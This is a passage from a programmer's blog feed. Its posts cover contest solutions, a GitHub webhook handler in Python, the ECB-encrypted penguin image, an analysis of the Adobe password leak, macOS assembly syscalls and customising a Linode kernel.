    # Find the the upper-left corner (J, I) and the edge K
    for I, row in enumerate(GRID):
        if not '#' in row: continue
        K = 0
        J = row.index('#')
        for x in range(J, N):
            if row[x] == '#': K += 1
            else: break
        break

    # If the square would not fit, fail
    if I + K &gt; N:
        print('Case #%i: NO' % t)
        continue
    
    # Build a module of how a row including the square should look like
    MOD = (J * '.' + K * '#').ljust(N, '.')

    # Check that the grid looks like what it should
    for i, row in enumerate(GRID):
        if i &gt;= I and i &lt; I + K:
            if row != MOD: break
        else:
            if row != N * '.': break
    else:
        # Reached if we didn't break out of the loop
        # Ok, I'll admit that for-else is not that clear
        print('Case #%i: YES' % t)
        continue

    print('Case #%i: NO' % t)
</code></pre></noscript></div>

<h2 id="basketball-game">Basketball Game</h2>

<p>Read the <a href="https://gist.github.com/FiloSottile/7643628#file-basketball-game-md">problem</a> and check out <a href="https://gist.github.com/FiloSottile/7643628#file-basketball_game-txt">the test cases</a> and <a href="https://gist.github.com/FiloSottile/7643628#file-basketball_game_answer-txt">the answer</a>.</p>

<p>This is actually my favorite. The problem was fun and the Python code reads as if it was English. It makes hard use of mutable objects and their properties.</p>

<div><script src="https://gist.github.com/7643628.js?file=Basketball%20Game.py"></script>
<noscript><pre><code>#!/usr/bin/env python3
#-*- coding:utf-8 -*-

import sys
INPUT = open(sys.argv[1])

class Player():
    name = None
    shot_percentage = None
    height = None
    draft = None
    time_played = 0

T = int(INPUT.readline().strip())

for t in range(1, T + 1):
    N, M, P = [int(x) for x in INPUT.readline().strip().split(' ')]
    PLAYERS = []
    for _ in range(N):
        player = Player()
        player.name, s, h = INPUT.readline().strip().split(' ')
        player.shot_percentage, player.height = int(s), int(h)
        PLAYERS.append(player)

    PLAYERS.sort(reverse=True, key=lambda p: (p.shot_percentage, p.height))
    for n, p in enumerate(PLAYERS):
        p.draft = n + 1

    TEAM_A = [p for p in PLAYERS if p.draft % 2 != 0]
    TEAM_B = [p for p in PLAYERS if p.draft % 2 == 0]

    PLAYING_A = TEAM_A[:P]
    PLAYING_B = TEAM_B[:P]

    for _ in range(M):
        for TEAM, PLAYING in ((TEAM_A, PLAYING_A), (TEAM_B, PLAYING_B)):
            if len(TEAM) == len(PLAYING): continue

            for p in PLAYING: p.time_played += 1

            BENCH = [p for p in TEAM if p not in PLAYING]

            leaving = sorted(PLAYING, key=lambda p: (p.time_played, p.draft))[-1]
            entering = sorted(BENCH, key=lambda p: (p.time_played, p.draft))[0]

            PLAYING.remove(leaving)
            PLAYING.append(entering)

            BENCH.remove(entering)
            BENCH.append(leaving)

    print('Case #%i: ' % t + ' '.join(sorted(p.name for p in PLAYING_A + PLAYING_B)))

</code></pre></noscript></div>

<h2 id="tennison">Tennison</h2>

<p>Read the <a href="https://gist.github.com/FiloSottile/7643628#file-tennison-md">problem</a> and check out <a href="https://gist.github.com/FiloSottile/7643628#file-tennison-txt">the test cases</a> and <a href="https://gist.github.com/FiloSottile/7643628#file-tennison_answer-txt">the answer</a>.</p>

<p>Finally the hardest one. This was a nice recursive problem. The constrains allowed for a lot of big test cases, so I went a bit overkill with speed, wrote some custom caching, ported my actual recursive function to Cython (it’s awesome! Just check out the <code>-a</code> HTML output to figure out what you have to optimize and you’re done) and made the program parallelizable.</p>

<p>Turns out, memoization would have been enough. Still, it has been really fun!</p>

<div><script src="https://gist.github.com/7643628.js?file=Tennison.py"></script>
<noscript><pre><code>#!/usr/bin/env python3
#-*- coding:utf-8 -*-

import pyximport; pyximport.install()
from fast_Tennison import play_a_set

from multiprocessing import Pool

import sys

T = int(sys.stdin.readline().strip())

TEST_CASES = []
for t in range(1, T + 1):
    l = sys.stdin.readline().strip().split(' ')
    K = int(l[0])
    ps, pr, pi, pu, pw, pd, pl = (float(x) for x in l[1:])
    won, lost = 0, 0
    TEST_CASES.append((t, {}, K, won, lost, pi, ps, pr, pu, pw, pd, pl))

def do(x):
    r = play_a_set(*x[1:])
    sys.stderr.write('#{}: {:f}\n'.format(x[0], r))
    return r
pool = Pool(processes=8)
RESULTS = pool.map(do, TEST_CASES, chunksize=1)

for t in range(1, T + 1):
    print('Case #{}: {:f}'.format(t, RESULTS[t-1]))
</code></pre></noscript></div>

<div><script src="https://gist.github.com/7643628.js?file=fast_Tennison.pyx"></script>
<noscript><pre><code>cpdef double play_a_set(cache, int K, int won, int lost, double p_sun, double ps, double pr, double pu, double pw, double pd, double pl):
    cdef double new_p_sun, positive

    if won == K: return 1
    if lost == K: return 0

    if won * 1000 + lost * 10 + p_sun in cache:
      return cache[won * 1000 + lost * 10 + p_sun]

    positive = 0

    ## There is sun     P: p_sun
    #### He wins            P: ps
    ###### p_sun changes        P: pw
    new_p_sun = min(1, p_sun + pu)
    positive += p_sun * ps * pw * play_a_set(cache, K, won+1, lost, new_p_sun, ps, pr, pu, pw, pd, pl)
    ###### p_sun stays          P: 1 - pw
    positive += p_sun * ps * (1 - pw) * play_a_set(cache, K, won+1, lost, p_sun, ps, pr, pu, pw, pd, pl)
    #### He loses           P: 1 - ps
    ###### p_sun changes        P: pl
    new_p_sun = max(0, p_sun - pd)
    positive += p_sun * (1 - ps) * pl * play_a_set(cache, K, won, lost+1, new_p_sun, ps, pr, pu, pw, pd, pl)
    ###### p_sun stays          P: 1 - pl
    positive += p_sun * (1 - ps) * (1 - pl) * play_a_set(cache, K, won, lost+1, p_sun, ps, pr, pu, pw, pd, pl)
    ## There is rain    P: 1 - p_sun
    #### He wins            P: pr
    ###### p_sun changes        P: pw
    new_p_sun = min(1, p_sun + pu)
    positive += (1 - p_sun) * pr * pw * play_a_set(cache, K, won+1, lost, new_p_sun, ps, pr, pu, pw, pd, pl)
    ###### p_sun stays          P: 1 - pw
    positive += (1 - p_sun) * pr * (1 - pw) * play_a_set(cache, K, won+1, lost, p_sun, ps, pr, pu, pw, pd, pl)
    #### He loses           P: 1 - pr
    ###### p_sun changes        P: pl
    new_p_sun = max(0, p_sun - pd)
    positive += (1 - p_sun) * (1 - pr) * pl * play_a_set(cache, K, won, lost+1, new_p_sun, ps, pr, pu, pw, pd, pl)
    ###### p_sun stays          P: 1 - pl
    positive += (1 - p_sun) * (1 - pr) * (1 - pl) * play_a_set(cache, K, won, lost+1, p_sun, ps, pr, pu, pw, pd, pl)

    cache[won * 1000 + lost * 10 + p_sun] = positive

    return positive
</code></pre></noscript></div>

<p>That’s all! I got admitted to the next round, so maybe <a href="https://twitter.com/FiloSottile">follow me on Twitter</a> if you want to read the next batch of problems and solutions!</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[A Python GitHub Push WebHook Handler]]></title>
      <link href="http://filippo.io/a-python-github-push-webhook-handler/"/>
    
    <updated>2013-11-24T19:23:00+01:00</updated>
    <id>http://filippo.io/a-python-github-push-webhook-handler</id>
    
      <content type="html"><![CDATA[<p>GitHub offers a number of <strong>Service Hooks</strong> that trigger actions when someone pushes to your repository. The generic hook is a simple WebHook that you can easily handle on your server.</p>

<p>There is a official Rack handler somewhere, and maybe a Django one, but nothing in pure Python. So here is it.</p>

<p>It’s pretty simple and self-contained, start it with the IP address and port to listen on as arguments, and it will pass a function - <code>handle_hook()</code> - the payload received on each push as a Python dictionary. It also checks that the originating IP is actually GH.</p>

<p>Then simply enter the address of your server on the GH Service Hooks repo Admin page, and you’re all set.</p>

<p><img src="http://filippo.io/images/Service Hooks 2013-11-24 00-54-05.png" alt="The Webhooks admin page" /></p>

<p>For reference on what’s inside the payload, <a href="https://help.github.com/articles/post-receive-hooks">RTFM</a>.</p>

<div><script src="https://gist.github.com/7634541.js?file=HookHandler.py"></script>
<noscript><pre><code>#!/usr/bin/env python
#-*- coding:utf-8 -*-

import BaseHTTPServer
import sys
import time
import urlparse
import json


HOST_NAME = sys.argv[1]
PORT_NUMBER = int(sys.argv[2])


def handle_hook(payload):
    pass


class HookHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    server_version = &quot;HookHandler/0.1&quot;
    def do_GET(s):
        s.send_response(200)
        s.wfile.write('Hello!')

    def do_POST(s):
        # Check that the IP is within the GH ranges
        if not any(s.client_address[0].startswith(IP)
                   for IP in ('192.30.252', '192.30.253', '192.30.254', '192.30.255')):
            s.send_error(403)

        length = int(s.headers['Content-Length'])
        post_data = urlparse.parse_qs(s.rfile.read(length).decode('utf-8'))
        payload = json.loads(post_data['payload'][0])

        handle_hook(payload)

        s.send_response(200)


if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), HookHandler)
    print time.asctime(), &quot;Server Starts - %s:%s&quot; % (HOST_NAME, PORT_NUMBER)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print time.asctime(), &quot;Server Stops - %s:%s&quot; % (HOST_NAME, PORT_NUMBER)
</code></pre></noscript></div>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[The ECB Penguin]]></title>
      <link href="http://filippo.io/the-ecb-penguin/"/>
    
    <updated>2013-11-10T19:54:00+01:00</updated>
    <id>http://filippo.io/the-ecb-penguin</id>
    
      <content type="html"><![CDATA[<p><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Tux ecb.jpg" class="center" /></p>

<p>This is an image that has become kind of a cultural icon in the cryptography and InfoSec community. I’m speaking about “the penguin”, a picture of the <a href="https://commons.wikimedia.org/wiki/File:Tux.jpg">Tux Linux mascot</a> encrypted with a block cipher in <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_.28ECB.29">ECB mode</a> that still shows clearly the outline of the original.</p>

<div class="reset-zoom"><blockquote class="twitter-tweet" data-conversation="none" align="center" data-dnt="true"><p>.<a href="https://twitter.com/solardiz">@solardiz</a> <a href="https://twitter.com/ErrataRob">@ErrataRob</a> ECB mode strikes again, I see. It&#39;s hard to believe there&#39;s anyone left who hasn&#39;t seen the penguin.</p>&mdash; Andrea (@puellavulnerata) <a href="https://twitter.com/puellavulnerata/statuses/396863689602519041">November 3, 2013</a></blockquote>
<script async="" src="http://filippo.io//platform.twitter.com/widgets.js" charset="utf-8"></script></div>

<!-- more -->

<p><img src="http://filippo.io/images/ecb penguin - Google.png" alt="Google suggestions" class="center" /></p>

<h2 id="ecb">ECB</h2>

<p>You have a cipher, that with a key will encrypt 16 bytes of data. And you have some data, that is more than 16 bytes. So you have a problem. Well, ECB is the wrong solution to that problem: you just encrypt each 16-bytes block separately.</p>

<p>Why is it wrong? Because this way blocks that were equal before encryption will <strong>remain equal</strong> also after! And this will lead to all kinds of unwanted consequences.</p>

<p>One good example is the recent <a href="http://filippo.io/analyzing-the-adobe-leaked-passwords/">Adobe passwords crossword game</a> but the best visualization of the concept is him, the penguin!</p>

<h2 id="the-original">The original</h2>

<p>The <a href="https://en.wikipedia.org/wiki/File:Tux_ecb.jpg">original image</a> has been created by <a href="https://en.wikipedia.org/wiki/User:Lunkwill">User:Lunkwill</a> of en.wikipedia in 2004 and added to the page “<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">Block cipher mode of operation</a>” with <a href="https://en.wikipedia.org/w/index.php?title=Block_cipher_mode_of_operation&amp;diff=prev&amp;oldid=2191923">this edit</a>.</p>

<p>It has even been <a href="https://en.wikipedia.org/wiki/Wikipedia:Featured_picture_candidates/April-2004#Tux_ecb.jpg">proposed as a Wikipedia featured picture</a>.</p>

<p>Nothing more is known about the original. I wrote an email to the author, and I will update the blog post if he replies.</p>

<h2 id="my-take-at-it">My take at it</h2>

<p>The picture is amazing, but rather low quality even for screen, let alone for printing. So, I decided to generate my own.</p>

<p>First thing needed was an image format where the pixels were represented sequentially as plain bytes, without any compression, and possibly with a simple header. The perfect candidate turned out to be the <a href="https://en.wikipedia.org/wiki/Netpbm_format#PPM_example">PPM binary format</a>, part of the Netpbm spec. (It is just basically a ASCII header and then a sequence of 3-bytes RGB representations of the pixels.)</p>

<p>Here is the process:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c"># First convert the Tux to PPM with Gimp</span>
</span><span class="line"><span class="c"># Then take the header apart</span>
</span><span class="line">head -n 4 Tux.ppm &gt; header.txt
</span><span class="line">tail -n +5 Tux.ppm &gt; body.bin
</span><span class="line"><span class="c"># Then encrypt with ECB (experiment with some different keys)</span>
</span><span class="line">openssl enc -aes-128-ecb -nosalt -pass pass:<span class="s2">&quot;ANNA&quot;</span> -in body.bin -out body.ecb.bin
</span><span class="line"><span class="c"># And finally put the result together and convert to some better format with Gimp</span>
</span><span class="line">cat header.txt body.ecb.bin &gt; Tux.ecb.ppm
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And the result! (<a href="http://www.cafepress.com/ecbpenguin.1060438520">Prints on sale</a>, it makes for a great nerdy office decoration, much like “Crypto Safety Procedures”)</p>

<p><a href="http://filippo.io/images/Tux-ECB.png"><img src="http://filippo.io/images/Tux-ECB-small.png" alt="Tux ecb.jpg" class="center" /></a></p>

<h3 id="bonus-pop-art">Bonus: pop art</h3>

<p>Also, the color combinations spawning from the different keys reminded me of the <a href="https://www.google.com/search?q=Marilyn+Monroe+by+Andy+Warhol&amp;tbm=isch">Marilyn Monroe by Andy Warhol</a>, so… (<a href="http://www.cafepress.com/ecbpenguin.1060711059">Poster</a>!)</p>

<p><img src="http://filippo.io/images/POP-xsmall.png" alt="POP Tuxes" class="center" /></p>

<p><a href="http://www.cafepress.com/ecbpenguin">Visit the shop</a> for other ECB Tux gear! Or just <a href="https://twitter.com/FiloSottile">follow me</a> on Twitter.</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Analyzing the Adobe leaked passwords]]></title>
      <link href="http://filippo.io/analyzing-the-adobe-leaked-passwords/"/>
    
    <updated>2013-11-04T11:15:00+01:00</updated>
    <id>http://filippo.io/analyzing-the-adobe-leaked-passwords</id>
    
      <content type="html"><![CDATA[<p><img src="http://imgs.xkcd.com/comics/encryptic.png" alt="XKCD is on it" class="center" /></p>

<p>On October Adobe reported that some user data, including credit cards and password dumps, got stolen from their servers. Now the passwords dump has leaked, and it’s hilarious.</p>

<p>We (Jari Takkala and I) got hold of the files and are starting to analyze them.</p>

<!-- more -->

<h2 id="the-files">The files</h2>

<p><strong>users.tar.gz</strong> (compressed) - 3.8 GB - e3eda0284c82aaf7a043a579a23a09ce<br />
<strong>cred</strong> (uncompressed) - 9.3GB - 020aaacc56de7a654be224870fb2b516</p>

<p>The 152,982,479 entries are formatted like this</p>

<p><code>UID-|--|-EMAIL-|-BASE64 PASSWORD-|-HINT|--</code></p>

<h2 id="the-algorithm-four-errors">The algorithm: four errors</h2>

<p>The passwords seem to be encrypted with a 8-bytes block cipher, allegedly 3DES, in ECB mode. This is bad for four main reasons:</p>

<ul>
  <li>
    <p><strong>It is fast</strong>: you don’t want a fast algorithm for storing your passwords, you want to make it slow, so that bruteforce is infeasible.</p>
  </li>
  <li>
    <p><strong>It is a block cipher</strong>: this is a complete misuse. Hashing, password strengthening and encryption are different things. Namely, the problem with this are that (A) you need to have access to the cipher password for all the time the system is online, and if that is compromised, <strong>all the passwords can be retrieved at once</strong> (B) you leak passwords lengths</p>
  </li>
  <li>
    <p><strong>It is used in ECB mode</strong>: ECB is evil, as every block of 8 bytes is encrypted separately and you can spot duplicates between 8-character blocks. The XKCD comic refers to this.</p>
  </li>
  <li>
    <p><strong>It is not salted</strong>: this means that duplicate passwords will stand out, but hey, they even went a step further with the point above.</p>
  </li>
</ul>

<h2 id="cracking">Cracking</h2>

<p>However, the use of a keyed cipher makes cracking the passwords with only a DB dump like this infeasible, even if we can get some nice stats out of it.</p>

<p>But again: it’s not secure because it’s a keyed cipher. The hacker might have the key for that, something that would allow him to read ALL the passwords, even the strong ones (this can’t happen with any proper hashing algorithm) and anyone with a 8-characters block in common with you will now (all or a portion of) your password.</p>

<p>Also, I’m eager to check if they used a strong master password…</p>

<h2 id="the-xkcd">The XKCD</h2>

<p>By the way, the comic is not using real data, the first hex block, Base64 encoded is <code>ThiswasnotY=</code> :)</p>

<h2 id="a-first-manual-effort">A first manual effort</h2>

<p>Jeremi Gosney (<a href="https://twitter.com/jmgosney">@jmgosney</a>) counted the password repetitions, took the most common ones and then guessed the plaintext either by getting it from one of the users or from the hints. Again: anyone that shares a 8-characters block with your key can recover it.</p>

<p><a href="http://stricture-group.com/files/adobe-top100.txt">http://stricture-group.com/files/adobe-top100.txt</a></p>

<p>We should crowdsource this.</p>

<hr />

<p>This is a rolling blog post, <a href="https://twitter.com/FiloSottile">follow me</a> on Twitter for updates</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Making system calls from Assembly in Mac OS X]]></title>
      <link href="http://filippo.io/making-system-calls-from-assembly-in-mac-os-x/"/>
    
    <updated>2013-11-04T02:05:00+01:00</updated>
    <id>http://filippo.io/making-system-calls-from-assembly-in-mac-os-x</id>
    
      <content type="html"><![CDATA[<p>The next step in my <a href="http://filippo.io/escaping-a-chroot-jail-slash-1/">playing with chroot escapes</a> is crafting some shellcode. Recently my main dev machine is a MacBook running OS X, so it felt reasonable to fiddle with making system calls of that platform.</p>

<p>By the way, a system call is a function of the kernel invoked by a userspace program and it can be something like writing to a file descriptor, or even exiting. Usually, these are wrapped by C functions in the standard library.</p>

<h3 id="the-system-calls">The system calls</h3>

<p>First, we need to know what system call we want to make, and what arguments it pretends.</p>

<p>A full list is hosted by Apple <a href="http://www.opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master">here</a>. The header also hints at the fact that they are inherited from BSD. Yeah, <a href="https://en.wikipedia.org/wiki/OS_X">that makes sense</a>.</p>

<p>So, to write our proverbial <em>Hello world</em> we will pick the syscall 4</p>

<pre><code>4   AUE_NULL    ALL { user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
</code></pre>

<!-- more -->

<h3 id="bit">32-bit</h3>

<p>Let’s start easy. A cute 32-bit program, written in <a href="http://alien.dowling.edu/~rohit/nasmdoc3.html">NASM assembler language</a>. Compile with <code>nasm</code> or <code>yasm</code>, output format <code>MachO</code>, and link with <code>ld</code>.</p>

<p>I’m on a Intel machine, so what we are looking for is the x86 syscall calling conventions for the OS X or BSD platform. They are pretty simple:</p>

<ul>
  <li>arguments passed on the stack, pushed right-to-left</li>
  <li>stack 16-bytes aligned</li>
  <li>syscall number in the <code>eax</code> register</li>
  <li>call by interrupt <code>0x80</code></li>
</ul>

<p>So what we have to do to print a “Hello world” is:</p>

<ul>
  <li>push the length of the string (<code>int</code>) to the stack</li>
  <li>push a pointer to the string to the stack</li>
  <li>push the stdout file descriptor (1) to the stack</li>
  <li>align the stack by moving the stack pointer 4 more bytes (16 - 4 * 3)</li>
  <li>set the <code>eax</code> register to the <code>write</code> syscall number (4)</li>
  <li>interrupt <code>0x80</code></li>
</ul>

<div><script src="https://gist.github.com/7125822.js?file=32.asm"></script>
<noscript><pre><code>; /usr/local/bin/nasm -f macho 32.asm &amp;&amp; ld -macosx_version_min 10.7.0 -o 32 32.o &amp;&amp; ./32

global start

section .text
start:
    push    dword msg.len
    push    dword msg
    push    dword 1
    mov     eax, 4
    sub     esp, 4
    int     0x80
    add     esp, 16

    push    dword 0
    mov     eax, 1
    sub     esp, 12
    int     0x80

section .data

msg:    db      &quot;Hello, world!&quot;, 10
.len:   equ     $ - msg
</code></pre></noscript></div>

<h3 id="bit-1">64-bit</h3>

<p>64-bit is a bit cleaner, but completely different: OS X (and GNU/Linux and everyone except Windows) on 64 architectures adopt the <a href="http://x86-64.org/documentation/abi.pdf">System V AMD64 ABI reference</a>. Jump to section <strong>A.2.1</strong> for the syscall calling convention.</p>

<ul>
  <li>arguments are passed on the registers <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>r10</code>, <code>r8</code> and <code>r9</code></li>
  <li>syscall number in the <code>rax</code> register</li>
  <li>the call is done via the <code>syscall</code> instruction</li>
  <li>what OS X contributes to the mix is that you have to add <code>0x20000000</code> to the syscall number (still have to figure out why)</li>
</ul>

<p>So, here is the (IMHO) much more clean 64-bit “Hello world”. Ah, if you want to do this at home and have it actually run, generate a <code>macho64</code> object with <strong>a new version of</strong> NASM or with YASM, and link with <code>ld</code> as usual.</p>

<div><script src="https://gist.github.com/7125822.js?file=64.asm"></script>
<noscript><pre><code>; /usr/local/bin/nasm -f macho64 64.asm &amp;&amp; ld -macosx_version_min 10.7.0 -lSystem -o 64 64.o &amp;&amp; ./64

global start


section .text

start:
    mov     rax, 0x2000004 ; write
    mov     rdi, 1 ; stdout
    mov     rsi, msg
    mov     rdx, msg.len
    syscall

    mov     rax, 0x2000001 ; exit
    mov     rdi, 0
    syscall


section .data

msg:    db      &quot;Hello, world!&quot;, 10
.len:   equ     $ - msg
</code></pre></noscript></div>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Customizing a Linode kernel]]></title>
      <link href="http://filippo.io/customizing-a-linode-kernel/"/>
    
    <updated>2013-10-15T23:15:00+02:00</updated>
    <id>http://filippo.io/customizing-a-linode-kernel</id>
    
      <content type="html"><![CDATA[<p>I’m trying to compartmentalize my Linode server with <a href="http://docker.io">Docker</a>, and so I’ll need a <strong>3.8+ 64-bit kernel with AUFS</strong> support<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Ok.</p>

<p>My old Linode was 32-bit, but using the Dashboard and the doubled storage Linode just upgraded me to I was able to add a <strong>Ubuntu 12.04 64-bit Configuration Profile and Disk Image</strong>, reboot to that and mount the old disk image to copy files over. So far so good.</p>

<p>The current Linode kernel is a custom <strong>3.9.3</strong>. Nice. But without <strong>AUFS support</strong>, ouch. Ok then, I’ll need to recompile this thing.</p>

<p>Also, <code>lxc-checkconfig</code> tells me that I miss support for a lot of things, so…</p>

<p>NOTE: There are easy tutorials<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup> telling you to use the vendor provided kernels, but I feel like there is a reason if Linode ships his own custom kernel, so I really want to just customize theirs.</p>

<!-- more -->

<h2 id="getting-the-source-and-putting-the-config-in-place">Getting the source and putting the config in place</h2>

<p>The Linode feature that allows us to load our own module is <a href="http://wiki.xen.org/wiki/PvGrub">PV-GRUB</a> and <a href="https://library.linode.com/custom-instances/pv-grub-custom-compiled-kernel">here</a> is the Linode Library article about that, keep it open for reference.</p>

<p>First, have a look at what kernel branch your box is currently running and download the tarball of its source from <a href="https://www.kernel.org">kernel.org</a>:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ uname -a
</span><span class="line">Linux li593-45 3.9.3-x86_64-linode33 #1 SMP Mon May 20 10:22:57 EDT 2013 x86_64 x86_64 x86_64 GNU/Linux
</span><span class="line">$ aria2c https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.9.11.tar.xz
</span><span class="line">[...]
</span><span class="line">$ tar xvf linux-3.9.11.tar.xz
</span><span class="line">[...]
</span><span class="line">$ cd linux-3.9.11</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Now we will extract the config from the running Linode kernel and update it in case there’s need.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ zcat /proc/config.gz &gt; .config
</span><span class="line">$ make oldconfig</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="mixing-aufs-in3">Mixing AUFS in<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup></h2>

<p>I’ll go fast over this, as it’s almost off-topic. You can skip to the next heading if you are not interested.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ git clone git://git.code.sf.net/p/aufs/aufs3-standalone aufs3-standalone.git
</span><span class="line">$ cd aufs3-standalone.git
</span><span class="line">$ git checkout origin/aufs3.9
</span><span class="line">$ cd ../linux-3.9.11/
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-kbuild.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-base.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-proc_map.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-standalone.patch
</span><span class="line">$ cp -a ../aufs3-standalone.git/{Documentation,fs} .
</span><span class="line">$ cp -a ../aufs3-standalone.git/include/uapi/linux/aufs_type.h include/uapi/linux/
</span><span class="line">$ cp -a ../aufs3-standalone.git/include/linux/aufs_type.h include/linux/</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="compiling">Compiling</h2>

<p>Great, finally we do our customizations to the config with <code>make menuconfig</code> (you’ll need <code>libncurses5-dev</code>) and compile. (I enabled AUFS in Misc filesystems and the things listed in the <code>lxc-checkconfig</code> source code)</p>

<p>Ah, you might want to change the name of the kernel to something like <code>3.9.11-custom</code>. You can do that by editing the following <code>Makefile</code> line like this:</p>

<pre><code>EXTRAVERSION = -custom
</code></pre>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ make
</span><span class="line"># make modules_install
</span><span class="line"># make install</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="installing">Installing</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line"># apt-get install grub-legacy-ec2
</span><span class="line"># sed -i 's/indomU=true/indomU=false/' /boot/grub/menu.lst
</span><span class="line"># update-grub-legacy-ec2</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And that’s it! Now go to the <strong>Linode Manager</strong>, edit your Configuration Profile to use <em>pv-grub-x86_64</em> as the “Kernel” and reboot.</p>

<p>You should be able to verify what you are running with <code>uname -a</code>, and if you need to see/interact with the boot process, the <strong>Lish console</strong> is like being in front of a screen. Have fun! (And why did we start in the first place…? Ah, Docker!)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">filosottile@li593-45:~$ uname -a
</span><span class="line">Linux li593-45 3.9.11-custom #3 SMP Tue Oct 15 19:57:48 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>NOTE: make sure that the first kernel listed in <code>/boot/grub/menu.lst</code> is your new one, as PV-GRUB boots the first kernel of the list and <code>make install</code> backups existing kernels to <code>*.old</code> copies, and these get positioned first by <code>update-grub</code>. I had a Linode blow up all over my face because of this.</p>

<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p><a href="http://docs.docker.io/en/latest/installation/kernel/">Kernel Requirements - Docker Documentation</a><a href="#fnref:1" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p><a href="http://coder1.com/node/87">Install Docker on Linode (Ubuntu 12.04)</a><a href="#fnref:2" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:3">
      <p><a href="http://aufs.sourceforge.net/">http://aufs.sourceforge.net/</a><a href="#fnref:3" rel="reference">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[A journal approach that actually works for me &#10150;]]></title>
      <link href="http://www.bulletjournal.com/"/>
    
    <updated>2013-10-15T20:57:00+02:00</updated>
    <id>http://filippo.io/a-journal-approach-that-actually-works-for-me</id>
    
      <content type="html"><![CDATA[<p>I usually don’t stick with productivity schemes for long, but I finally found one that seems to work for me: <strong>Bullet Journal</strong>. It replaced all my list-making and note-taking apps.</p>

<p>It basically helps you to organize your <strong>pen-and-paper note-taking</strong>. It provides guidance and avoids confusion, but it is not too over-structured, so you are still free to take notes as you want and you won’t have to stick to particular procedures (like with GTD).</p>

<p>Have a look at the video, it is actually enjoyable and gives you a good overview of the system. (This also is a first, I’m usually a text person.)</p>

<p><img src="http://filippo.io/images/2013-10-15 20.50.26.jpg" alt="A daily notes page and some random notes" /></p>

<p><img src="http://filippo.io/images/2013-10-15 20.50.38.jpg" alt="A month view" /></p>
<br><a href="http://filippo.io/a-journal-approach-that-actually-works-for-me/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Escaping a chroot jail/1]]></title>
      <link href="http://filippo.io/escaping-a-chroot-jail-slash-1/"/>
    
    <updated>2013-10-14T10:00:00+02:00</updated>
